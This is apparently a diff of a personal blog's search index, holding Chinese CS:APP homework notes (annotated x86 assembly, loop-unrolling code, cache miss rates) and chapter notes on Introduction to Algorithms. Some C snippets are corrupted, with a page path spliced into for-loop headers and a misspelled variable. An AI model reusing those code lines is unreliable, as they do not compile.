-<h3 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h3><p>代码采用的是直接求值的方法，不是Homer法。</p>
-<p>优化的方法有：</p>
-<ol>
-<li>消除循环的低效率，limit=degree-5，不用每次都计算degree-5；</li>
-<li>循环展开，展开六次，每次算六个a；</li>
-<li>三路并行，临时变量存储；</li>
-<li>关键路径决定的CPE是双精度乘法延迟的六分之一，但是因为加载操作每个周期一次，所以CPE还是1.</li>
-</ol>
+<p>请分析每一行汇编代码的意义，并给出常数<code>H</code>和<code>J</code>的值。（20.0分）</p>
+<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>如下为一个c语言程序中的函数及其在32位系统下编译得到的汇编语言程序代码，</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">aprod</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, x, y, z;</span><br><span class="line">    <span class="keyword">int</span> r = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; （  <span class="number">1</span>  ）; （  <span class="number">2</span>  ）) &#123;       <span class="comment">//i&lt;(n-2)    i+=3</span></span><br><span class="line">        （  <span class="number">3</span>  ）;                           <span class="comment">//x=a[i]</span></span><br><span class="line">        （  <span class="number">4</span>  ）;                           <span class="comment">//y=a[i+1]</span></span><br><span class="line">        （  <span class="number">5</span>  ）;                           <span class="comment">//z=a[i+2]</span></span><br><span class="line">        （  <span class="number">6</span>  ）;                           <span class="comment">//r=r*x*y*z</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; n; i++)</span><br><span class="line">        （  <span class="number">7</span>  ）;                           <span class="comment">//r=a[i]*r  </span></span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在32位系统中用<code>gcc</code>编译后，函数<code>aprod</code>对应的汇编语言程序代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aprod:</span><br><span class="line">pushl     %ebp           //ebp入栈</span><br><span class="line">movl     %esp, %ebp      //ebp设为现在的帧指针</span><br><span class="line">subl     $32, %esp       //esp=esp-32，预留32字节给函数临时变量</span><br><span class="line">movl     $1, -20(%ebp)   //r=M(ebp-20)=1</span><br><span class="line">movl     $0, -4(%ebp)    //i=M(ebp-4)=0</span><br><span class="line">jmp      .l2             //无条件跳转到.l2</span><br><span class="line"></span><br><span class="line">.l3:</span><br><span class="line">movl     -4(%ebp), %eax  //eax=M(ebp-4)=i</span><br><span class="line">sall     $2, %eax        //eax=eax*4=i*4</span><br><span class="line">addl     8(%ebp), %eax   //eax=eax+M(8+ebp)=4i+a[]</span><br><span class="line">movl     (%eax), %eax    //eax=M(eax)=a[i]</span><br><span class="line">movl     %eax, -8(%ebp)  //x=M(ebp-8)=eax=a[i]</span><br><span class="line">movl     -4(%ebp), %eax  //eax=M(ebp-4)=i</span><br><span class="line">addl     $1, %eax        //eax=eax+1=i+1</span><br><span class="line">sall     $2, %eax        //eax=eax*4=4*(i+1)</span><br><span class="line">addl     8(%ebp), %eax   //eax=M(8+ebp)=4*[i+1]+a[]</span><br><span class="line">movl     (%eax), %eax    //eax=M(eax)=a[i+1]</span><br><span class="line">movl     %eax, -12(%ebp) //y=M(ebp-12)=eax=a[i+1]</span><br><span class="line">movl     -4(%ebp), %eax  //eax=(ebp-4)=i</span><br><span class="line">addl     $2, %eax        //eax=eax+2=i+2</span><br><span class="line">sall     $2, %eax         //eax=eax*4=4*(i+2)</span><br><span class="line">addl     8(%ebp), %eax    //eax=eax+M(8+ebp)=a[]+4*(i+2)</span><br><span class="line">movl     (%eax), %eax     //eax=M(eax)=a[i+2]</span><br><span class="line">movl     %eax, -16(%ebp)  //z=M(-16+ebp)=eax=a[i+2]</span><br><span class="line">movl     -20(%ebp), %eax  //eax=M(-20+ebp)=r</span><br><span class="line">imull     -8(%ebp), %eax  //eax*=M(-8+ebp)=r*x</span><br><span class="line">imull     -12(%ebp), %eax //eax*=M(-12+ebp)=r*x*y</span><br><span class="line">imull     -16(%ebp), %eax  //eax*=M(-16+ebp)=r*x*y*z</span><br><span class="line">movl     %eax, -20(%ebp)  //r=M(-20+ebp)=eax=r*x*y*z</span><br><span class="line">addl     $3, -4(%ebp)     //i=M(-4+ebp)+=3=i+3</span><br><span class="line"></span><br><span class="line">.l2:</span><br><span class="line">movl     12(%ebp), %eax    //eax=M(12+ebp)=n</span><br><span class="line">subl     $2, %eax          //eax=eax-2=n-2</span><br><span class="line">cmpl     -4(%ebp), %eax    //compare eax=n-2 with M(ebp-4)=i</span><br><span class="line">jg       .l3               //eax=n-2 &gt; M(ebp-4)=i则跳转.l3</span><br><span class="line">jmp      .l4               //无条件跳转.l4</span><br><span class="line"></span><br><span class="line">.l5:</span><br><span class="line">movl     -4(%ebp), %eax   //eax=M(-4+ebp)=i</span><br><span class="line">sall     $2, %eax         //eax=eax*4=4*i</span><br><span class="line">addl     8(%ebp), %eax    //eax=eax+M(8+ebp)=a[]+4*i</span><br><span class="line">movl     (%eax), %eax     //eax=M(eax)=a[i]</span><br><span class="line">movl     -20(%ebp), %edx   //edx=M(-20+ebp)=r</span><br><span class="line">imull     %edx, %eax      //eax=eax*edx=a[i]*r</span><br><span class="line">movl     %eax, -20(%ebp)   //r=M(-20+ebp)=eax=a[i]*r</span><br><span class="line">addl     $1, -4(%ebp)      //i=M(-4+ebp)+1</span><br><span class="line"></span><br><span class="line">.l4:</span><br><span class="line">movl     -4(%ebp), %eax    //eax=M(-4+ebp)=i</span><br><span class="line">cmpl     12(%ebp), %eax    //compare eax=i with M(12+ebp)=n</span><br><span class="line">jl       .l5               //eax=i &lt; M(12+ebp)=n则跳转</span><br><span class="line">movl     -20(%ebp), %eax   //eax=M(-20+ebp)=r，返回值为r</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>请详细说明每条汇编语句的意义，并将这个函数补充完整。（40.0分）</p>
+<h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p>如下为一个c语言程序中的函数及其在32位系统下编译得到的汇编语言程序代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//incl  ude &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">frac</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;           </span><br><span class="line">    <span class="keyword">if</span>(a&lt;<span class="number">2</span>) <span class="keyword">return</span> ______;           <span class="comment">//a*a</span></span><br><span class="line">    <span class="keyword">return</span> _______;                  <span class="comment">//frac(a-2)+a</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c= ______;                  <span class="comment">// frac(a+b)</span></span><br><span class="line">    <span class="keyword">return</span> ______;                  <span class="comment">// 2*c+b</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">10</span>,j=<span class="number">6</span>;</span><br><span class="line">    <span class="keyword">int</span> k=sum(_______,______);       <span class="comment">//int k=sum(j-i,i++);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对应的汇编代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frac:</span><br><span class="line">pushl  %ebp             //ebp入栈</span><br><span class="line">movl  %esp, %ebp        //ebp=esp，设为当前的帧指针</span><br><span class="line">subl  $24, %esp         //esp=esp-24，预留24字节给临时变量</span><br><span class="line">cmpl  $1, 8(%ebp)       //compare a=M(8+ebp) with 1</span><br><span class="line">jg    .l2                //a=M(8+ebp) &gt; 1则跳转到.l2</span><br><span class="line">movl  8(%ebp), %eax      //eax=M(8+ebp)=a</span><br><span class="line">imull  8(%ebp), %eax     //eax*=M(8+ebp)=a*a</span><br><span class="line">jmp   .l3                 //无条件跳转.l3</span><br><span class="line"></span><br><span class="line">.l2:</span><br><span class="line">movl  8(%ebp), %eax      //eax=M(8+ebp)=a</span><br><span class="line">subl  $2, %eax           //eax=eax-2=a-2</span><br><span class="line">movl  %eax, (%esp)        //M(esp)=eax=a-2</span><br><span class="line">call  frac               //递归fun(a-2)</span><br><span class="line">addl  8(%ebp), %eax       //eax=eax+M(8+ebp)=fun(a-2)+a</span><br><span class="line"></span><br><span class="line">.l3:</span><br><span class="line">leave</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">sum:</span><br><span class="line">pushl  %ebp              //ebp入栈</span><br><span class="line">movl  %esp, %ebp         //ebp=esp,设为现在的栈指针</span><br><span class="line">subl  $40, %esp          //esp=esp-40,预留40字节给临时变量</span><br><span class="line">movl  12(%ebp), %eax     //eax=M(ebp+12)=b</span><br><span class="line">movl  8(%ebp), %edx      //edx=M(ebp+8)=a</span><br><span class="line">addl  %edx, %eax         //eax=eax+edx=a+b</span><br><span class="line">movl  %eax, (%esp)       //M(esp)=eax=a+b</span><br><span class="line">call  frac               //调用frac(a+b)</span><br><span class="line">movl  %eax, -12(%ebp)    //c=M(ebp-12)=eax=frac(a+b)</span><br><span class="line">movl  -12(%ebp), %eax    //eax=M(ebp-12)=c</span><br><span class="line">addl  %eax, %eax         //eax=2*eax=2*c</span><br><span class="line">addl  12(%ebp), %eax     //eax=eax+M(ebp+12)=2*c+b</span><br><span class="line">leave</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">pushl  %ebp           //ebp入栈</span><br><span class="line">movl  %esp, %ebp      //ebp设为现在的栈指针</span><br><span class="line">andl  $-16, %esp      //esp=esp &amp; 0xfffffff0</span><br><span class="line">subl  $32, %esp       //esp=esp-32,预留32位字节给临时变量</span><br><span class="line">movl  $10, 20(%esp)   //i=M(20+esp)=10</span><br><span class="line">movl  $6, 24(%esp)    //j=M(24+esp)=6</span><br><span class="line">movl  20(%esp), %eax  //eax=M(20+esp)=i</span><br><span class="line">movl  24(%esp), %edx  //edx=M(24+esp)=j</span><br><span class="line">subl  %eax, %edx       //edx=edx-eax=j-i=-4</span><br><span class="line">movl  20(%esp), %eax   //eax=M(20+esp)=i=10</span><br><span class="line">addl  $1, 20(%esp)     //i=M(20+esp)+1=11</span><br><span class="line">movl  %edx, 4(%esp)    //M(4+esp)=edx=-4</span><br><span class="line">movl  %eax, (%esp)     //M(esp)=eax=10</span><br><span class="line">call  sum              //调用sum(j-i,i++)</span><br><span class="line">movl  %eax, 28(%esp)   //k=M(28+esp)=eax，将sum函数返回值赋给k</span><br><span class="line">movl  $0, %eax         //eax=0, return 0</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>请详细说明每条汇编语句的意义，并将这个函数补充完整。（40.0分）</p>
 ]]></content>
       <categories>
         <category>CS:APP</category>
@@ -3195,6 +3164,40 @@ php反序列化漏洞。
 <h3 id="E、对于情况3，更大的块大小帮助降低不命中率吗？原因？"><a href="#E、对于情况3，更大的块大小帮助降低不命中率吗？原因？" class="headerlink" title="E、对于情况3，更大的块大小帮助降低不命中率吗？原因？"></a>E、对于情况3，更大的块大小帮助降低不命中率吗？原因？</h3><p>会降低，因为一个块的大小增加，冷不命中的频率就降低。</p>
 <h2 id="题五：家庭作业6-42"><a href="#题五：家庭作业6-42" class="headerlink" title="题五：家庭作业6.42"></a>题五：家庭作业6.42</h2><p>每行只有4个字节，那只可能是循环中后三个命中，第一个不命中，不命中率为0.25。</p>
 <h2 id="题六：家庭作业6-43"><a href="#题六：家庭作业6-43" class="headerlink" title="题六：家庭作业6.43"></a>题六：家庭作业6.43</h2><p>每行只有4个字节，每次要写一个char，不命中率仍然为0.25</p>
+]]></content>
+      <categories>
+        <category>CS:APP</category>
+      </categories>
+      <tags>
+        <tag>课程作业</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>深入理解计算机系统——课程作业5</title>
+    <url>/2021/05/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A5/</url>
+    <content><![CDATA[<h1 id="深入理解计算机系统——课程作业5"><a href="#深入理解计算机系统——课程作业5" class="headerlink" title="深入理解计算机系统——课程作业5"></a>深入理解计算机系统——课程作业5</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>突然要做作业不会做，昨天学了一手，今天开始写</p>
+<h2 id="题一：p376家庭作业5-15"><a href="#题一：p376家庭作业5-15" class="headerlink" title="题一：p376家庭作业5.15"></a>题一：p376家庭作业5.15</h2><h3 id="A、画关键路径"><a href="#A、画关键路径" class="headerlink" title="A、画关键路径"></a>A、画关键路径</h3><p><img src="/2021/05/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A5/image-20210524172744364.png" alt="image-20210524172744364"></p>
+<p><img src="/2021/05/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A5/image-20210524174834951.png" alt="image-20210524174834951"></p>
+<p><img src="/2021/05/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A5/image-20210524175909779.png" alt="image-20210524175909779"></p>
+<h3 id="B、对于float数据类型，关键路径决定的CPE下限是什么"><a href="#B、对于float数据类型，关键路径决定的CPE下限是什么" class="headerlink" title="B、对于float数据类型，关键路径决定的CPE下限是什么"></a>B、对于float数据类型，关键路径决定的CPE下限是什么</h3><p>单精度的加法运算的延迟CPE是3</p>
+<h3 id="C、整数数据的关键路径决定的CPE的下界是什么"><a href="#C、整数数据的关键路径决定的CPE的下界是什么" class="headerlink" title="C、整数数据的关键路径决定的CPE的下界是什么"></a>C、整数数据的关键路径决定的CPE的下界是什么</h3><p>整数的加法运算的延迟CPE是1</p>
+<h3 id="D、解释两个浮点版本的CPE为什么都是3，即使乘法需要4-5个周期"><a href="#D、解释两个浮点版本的CPE为什么都是3，即使乘法需要4-5个周期" class="headerlink" title="D、解释两个浮点版本的CPE为什么都是3，即使乘法需要4-5个周期"></a>D、解释两个浮点版本的CPE为什么都是3，即使乘法需要4-5个周期</h3><p>因为单精度和双精度的加法运算CPE都是3。</p>
+<p>对于乘法运算来说，因为没有数据相关，所以它可以进行流水线式地执行，发射时间是1，不会比3更大。</p>
+<h2 id="题二：p376家庭作业5-16"><a href="#题二：p376家庭作业5-16" class="headerlink" title="题二：p376家庭作业5.16"></a>题二：p376家庭作业5.16</h2><h3 id="三次循环展开的代码："><a href="#三次循环展开的代码：" class="headerlink" title="三次循环展开的代码："></a>三次循环展开的代码：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inner5</span><span class="params">(vec_ptr x, vec_ptr y, <span class="keyword">data_t</span> *dest)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> length = vec_length(x);</span><br><span class="line">	<span class="keyword">data_t</span> *xdata = get_vec_start(x);</span><br><span class="line">	<span class="keyword">data_t</span> *ydata = get_vec_start(y);</span><br><span class="line">	<span class="keyword">data_t</span> sum = (<span class="keyword">data_t</span>) <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">int</span> limit = length - <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">for</span> (深入理解计算机系统——课程作业<span class="number">5</span>/i = <span class="number">0</span>; i &lt; limit; i += <span class="number">3</span>) &#123;</span><br><span class="line">		sum = sum + xdata[i] * ydata[i]</span><br><span class="line">		      + xdata[i + <span class="number">1</span>] * ydata[i + <span class="number">1</span>]</span><br><span class="line">		      + xdata[i + <span class="number">2</span>] * ydata[i + <span class="number">2</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (; i &lt; length; i++) &#123;</span><br><span class="line">		sum = sum + xdata[i] * ydata[i];</span><br><span class="line">	&#125;</span><br><span class="line">	*dest = sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="A、解释为什么任何版本的内积过程都不能达到比2更小的CPE"><a href="#A、解释为什么任何版本的内积过程都不能达到比2更小的CPE" class="headerlink" title="A、解释为什么任何版本的内积过程都不能达到比2更小的CPE"></a>A、解释为什么任何版本的内积过程都不能达到比2更小的CPE</h3><p>由于加载单元每个时钟周期只能启动一条加载操作。</p>
+<p>如果每次计算时要从两个存储器位置中加载数据，就要分两次进行，所以CPE不可能小于2</p>
+<h3 id="B、为什么浮点数据的性能不会通过循环展开得到提高。"><a href="#B、为什么浮点数据的性能不会通过循环展开得到提高。" class="headerlink" title="B、为什么浮点数据的性能不会通过循环展开得到提高。"></a>B、为什么浮点数据的性能不会通过循环展开得到提高。</h3><p>因为关键路径还是length个浮点加法，虽然迭代次数减半了，但是每次迭代中还是有两个顺序的加法操作。</p>
+<h2 id="题三：p376家庭作业5-20"><a href="#题三：p376家庭作业5-20" class="headerlink" title="题三：p376家庭作业5.20"></a>题三：p376家庭作业5.20</h2><h3 id="实现代码："><a href="#实现代码：" class="headerlink" title="实现代码："></a>实现代码：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">poly_optimized</span><span class="params">(<span class="keyword">double</span> a[], <span class="keyword">double</span> x, <span class="keyword">int</span> degree)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">double</span> result = a[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">double</span> xpwr = x;</span><br><span class="line">	<span class="keyword">double</span> x2 = x * x;</span><br><span class="line">	<span class="keyword">double</span> x3 = x2 * x;</span><br><span class="line">	<span class="keyword">double</span> x4 = x3 * x;</span><br><span class="line">	<span class="keyword">double</span> x5 = x4 * x;</span><br><span class="line">	<span class="keyword">double</span> x6 = x5 * x;</span><br><span class="line">	<span class="keyword">int</span> limit = degree - <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">for</span> (深入理解计算机系统——课程作业<span class="number">5</span>/i = <span class="number">1</span>; i &lt;= limit; i += <span class="number">6</span>) &#123;</span><br><span class="line">		<span class="keyword">double</span> result1 = a[i] + a[i + <span class="number">1</span>] * x;</span><br><span class="line">		<span class="keyword">double</span> result2 = a[i + <span class="number">2</span>] * x2 + a[i + <span class="number">3</span>] * x3;</span><br><span class="line">		<span class="keyword">double</span> result3 = a[i + <span class="number">4</span>] * x4 + a[i + <span class="number">5</span>] * x5;</span><br><span class="line">		result += (rseult1 + result2 + result3) * xpwr;</span><br><span class="line">		xpwr *= x6;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (; i &lt;= degree; i++) &#123;</span><br><span class="line">		result += a[i] * xpwr;</span><br><span class="line">		xpwr *= x;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h3><p>代码采用的是直接求值的方法，不是Homer法。</p>
+<p>优化的方法有：</p>
+<ol>
+<li>消除循环的低效率，limit=degree-5，不用每次都计算degree-5；</li>
+<li>循环展开，展开六次，每次算六个a；</li>
+<li>三路并行，临时变量存储；</li>
+<li>关键路径决定的CPE是双精度乘法延迟的六分之一，但是因为加载操作每个周期一次，所以CPE还是1.</li>
+</ol>
 ]]></content>
       <categories>
         <category>CS:APP</category>
@@ -3342,6 +3345,54 @@ php反序列化漏洞。
       </tags>
   </entry>
   <entry>
+    <title>算法导论——第1章</title>
+    <url>/2021/06/11/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA%E2%80%94%E2%80%94%E7%AC%AC1%E7%AB%A0/</url>
+    <content><![CDATA[<h1 id="算法导论——第1章-算法在计算中的作用"><a href="#算法导论——第1章-算法在计算中的作用" class="headerlink" title="算法导论——第1章 算法在计算中的作用"></a>算法导论——第1章 算法在计算中的作用</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>什么是算法？为什么算法值得研究？相对于计算机使用的其他技术来说算法的作用是什么？</p>
+<p>本章我们将回答这些问题。</p>
+<h2 id="1-1-算法"><a href="#1-1-算法" class="headerlink" title="1.1 算法"></a>1.1 算法</h2><p><strong>算法</strong>就是<strong>任何良定义（well-defined）的计算过程</strong>，该过程取某个值或值的集合作为<strong>输入</strong>并<strong>产生</strong>某个值或值的集合作为<strong>输出</strong>。</p>
+<blockquote>
+<p>良定义（well defined）就是指<strong>无歧义的、不会导致矛盾的、符合其应满足的所有要求</strong>的定义</p>
+</blockquote>
+<p><strong>问题陈述</strong>说明了期望的输入和输出之间的<strong>关系</strong>。<strong>算法</strong>描述实现这个关系的<strong>计算过程</strong>。</p>
+<p><strong>问题实例</strong>由计算该问题所必须的（满足问题陈述中的各种约束条件的）<strong>输入</strong>组成。</p>
+<p>若对每个<strong>输入实例</strong>，算法都以<strong>正确的输出</strong>停机，则称该算法是<strong>正确的</strong>，并称该算法<strong>解决了</strong>给定的计算问题。</p>
+<p><strong>算法解决的问题：</strong></p>
+<ol>
+<li><strong>人类基因工程。</strong>识别人类DNA中的所有10万个基因，确定构成DNA的30亿个化学基对的序列，在数据库中<strong>存储这类信息</strong>并<strong>为数据分析开发工具</strong>。</li>
+<li><strong>互联网</strong>使得全世界的人都能快速地访问与检索大量信息。借助于一些聪明的算法，互联网上的网站能够<strong>管吗理和处理这些海量数据</strong>。必须使用算法的问题示例包括为<strong>数据传输寻找好的路由</strong>（求解这些问题的技术在第24章给出），<strong>使用一个搜索引擎来快速地找到特定信息所在的网页</strong>（有关技术在11章和32章中）</li>
+<li><strong>电子商务</strong>使得货物与服务能够以电子方式洽谈与交换，并且它依赖于像信用卡号、密码和银行结单这类个人信息的保密性。电子商务中使用的核心技术包括(第31章中包含的)<strong>公钥密码与数字签名，它们以数值算法和数论为基础</strong>。</li>
+<li>制造业和其他商务企业常常需要<strong>按最有益的方式来分配稀有资源</strong>。一家石油公司也许希望知道在什么地方设置其油井，以便最大化其预期的利润。一位政治候选人也许想确定在什么地方花钱购买竞选广告，以便最大化赢得竞选的机会。一家航空公司也许希望按尽可能最廉价的方式把乘务员分配到班机上，以确保每个航班被覆盖并且满足政府有关乘务员调度的法规。一个互联网服务提供商也许希望确定在什么地方放置附加的资源，以便更有效地服务其顾客。所有这些都是可以用<strong>线性规划</strong>来求解的问题的例子，我们将在第29章学习这种技术。 </li>
+</ol>
+<p><strong>更加具体的问题：</strong></p>
+<ol>
+<li>给定一张交通图，上面标记了每对相邻十字路口之间的距离，我们希望确定从一个十字路口到另一个十字路口的<strong>最短道路</strong>。<br>即使不允许穿过自身的道路，可能路线的数量也会很大。在所有可能路线中，我们如何选择哪一条是最短的？<br>这里首先把交通图(它本身就是实际道路的一个模型)<strong>建模为一个图</strong>(第六部分和附录B将涉及这个概念)，然后<strong>寻找图中</strong>从一个顶点到另一个顶点的<strong>最短路径</strong>。第24章将介绍如何有效地求解这个问题。</li>
+<li>给定两个<strong>有序的符号序列X和Y</strong>，求出X和Y的<strong>最长公共子序列</strong>。<br>X的<strong>子序列就是去掉一些元素</strong>(可能是所有，也可能一个没有)后的X。例如，(A，B，C，D，E，F，G)的一个子序列是(B，C，E，G)。X和Y的<strong>最长公共子序列的长度度量了这两个序列的相似程度</strong>。例如，若两个序列是DNA链中的基对则当它们具有长的公共子序列时我们认为它们是相似的。<br>若X有m个符号且Y有n个符号，则X和Y分别有2^m和2^n个可能的子序列。除非m和n很小，否则选择X和Y的所有可能子序列做匹配将花费使人望而却步多的时间。第15章将介绍如何使用一种称为<strong>动态规划</strong>的一般技术来有效地求解这个问题。</li>
+<li>给定一个依据部件库的机械设计，其中每个部件可能包含其他部件的实例，<strong>我们需要依次列出这些部件，以使每个部件出现在使用它的任何部件之前</strong>。若该<strong>设计由n个部件组成</strong>，则<strong>存在n!种可能的顺序</strong>，其中n!表示阶乘函数。<br>因为阶乘函数甚至比指数函数增长还快，（除非我们只有几个部件，否则）先生成每种可能的顺序，再验证按该顺序每个部件出现在使用它的部件之前，是不可行的。这个问题是<strong>拓扑排序</strong>的一个实例，第22章将介绍如何有效地求解这个问题。</li>
+<li>给定平面上的n个点，我们希望寻找这些点的凸壳。<strong>凸壳就是包含这些点的最小的凸多边形</strong>。直观上，我们可以把每个点看成由从一块木板钉出的一颗钉子来表示。凸壳则由一根拉紧的环绕所有钉子的橡皮筋来表示。如果橡皮筋因绕过某颗钉子而转弯，那么这颗钉子就是凸壳的一个顶点(例子参见图33-6)。<br>n个点的2”个子集中的任何一个都可能是凸壳的顶点集。仅知道哪些点是凸壳的顶点还很不够，因为我们还必须知道它们出现的顺序。所以为求凸壳的顶点，存在许多选择。<strong>第33章将给出两种用于求凸壳的好方法。</strong></li>
+</ol>
+<p>从上述问题中，<strong>算法问题共有的两个特征</strong>：</p>
+<ol>
+<li><strong>存在许多候选解</strong>，但绝大多数候选解都没有解决手头的问题。<strong>寻找一个真正的解或一个最好的解</strong>可能是一个很大的挑战。</li>
+<li><strong>存在实际应用。</strong>在上面所列的问题中，<strong>最短路径问题</strong>提供了最易懂的例子。一家运输公司(如公路运输或铁路运输公司)对如何在公路或铁路网中找出最短路径，有着经济方面的利益，因为采用的路径越短，其人力和燃料的开销就越低。互联网上的一个路由结点为了快速地发送一条消息可能需要寻找通过网络的最短路径。</li>
+</ol>
+<p><strong>数据结构</strong>是一种存储和组织数据的方式，旨在便于访问和修改。</p>
+<p><strong>技术。</strong>虽然可以把本书当做一本有关算法的“菜谱”来使用，但是也许在某一天你会遇到一个问题，一时无法很快找到一个已有的算法来解决它（例如本书中的许多练习和思考题就是这样的情况）。<br>本书将教你一些<strong>算法设计与分析的技术</strong>，以便你能<strong>自行设计算法、证明其正确性和理解其效率。</strong><br>不同的章介绍算法问题求解的不同方面。有些章处理特定的问题，例如，<strong>第9章</strong>的求中位数和顺序统计量，<strong>第23章</strong>的计算最小生成树，<strong>第26章</strong>的确定网络中的最大流。其他章介绍一些技术，例如<strong>第4章</strong>的分治策略，<strong>第15章</strong>的动态规划，<strong>第17章</strong>的摊还分析。</p>
+<p><strong>难题。NP完全问题</strong>中每个问题的复杂度与整个类的复杂度有关联性，假如其中任意一个问题在多项式时间内可解的，则这一类问题都是多项式时间可解。这类问题没有已知的有效算法，但我们可以找到一些<strong>“近似算法”</strong>。</p>
+<p><strong>并行性。</strong>为了从多核计算机获得最佳的性能，<strong>设计算法时必须考虑并行性</strong>。第27章给出了<strong>充分利用多核的“多线程”算法</strong>的一个模型。从理论的角度来看，该模型具有一些优点，它形成了几个成功的计算机程序的基础，包括一个国际象棋博弈程序。</p>
+<h2 id="1-2-作为一种技术的算法"><a href="#1-2-作为一种技术的算法" class="headerlink" title="1.2 作为一种技术的算法"></a>1.2 作为一种技术的算法</h2><p><strong>有效的算法</strong>可以帮助我们明智地去使<strong>用时间（计算时间）和空间（存储器空间）资源</strong>。</p>
+<p><strong>效率。</strong>为<strong>求解相同问题</strong>而设计的<strong>不同算法</strong>在<strong>效率方面</strong>常常有<strong>显著差别</strong>，这些差别可能比<strong>由于硬件和软件造成的差别</strong>要重要得多。</p>
+<p>我们应该像计算机硬件一样把<strong>算法看成一种技术</strong>，因为整个系统的性能不但依赖于快速的硬件也依赖于有效的算法。</p>
+<p><strong>相对于其他先进技术</strong>，算法也是十分重要的技术。因为所有这些都广泛地使用算法，<strong>算法</strong>是当代计算机中使用的<strong>大多数技术的核心</strong>。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这章概述算法这种技术，让读者认识一些<strong>算法概念</strong>，知道算法的地位和<strong>重要性</strong>。</p>
+]]></content>
+      <categories>
+        <category>Algorithm</category>
+      </categories>
+      <tags>
+        <tag>算法导论</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>算法导论——基本内容介绍</title>
     <url>/2021/06/10/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E5%86%85%E5%AE%B9%E4%BB%8B%E7%BB%8D/</url>
     <content><![CDATA[<h1 id="算法导论——基本内容介绍"><a href="#算法导论——基本内容介绍" class="headerlink" title="算法导论——基本内容介绍"></a>算法导论——基本内容介绍</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>因为学校的书看不懂，所以想换本书看看</p>
@@ -3464,54 +3515,6 @@ php反序列化漏洞。
       </tags>
   </entry>
   <entry>
-    <title>算法导论——第1章</title>
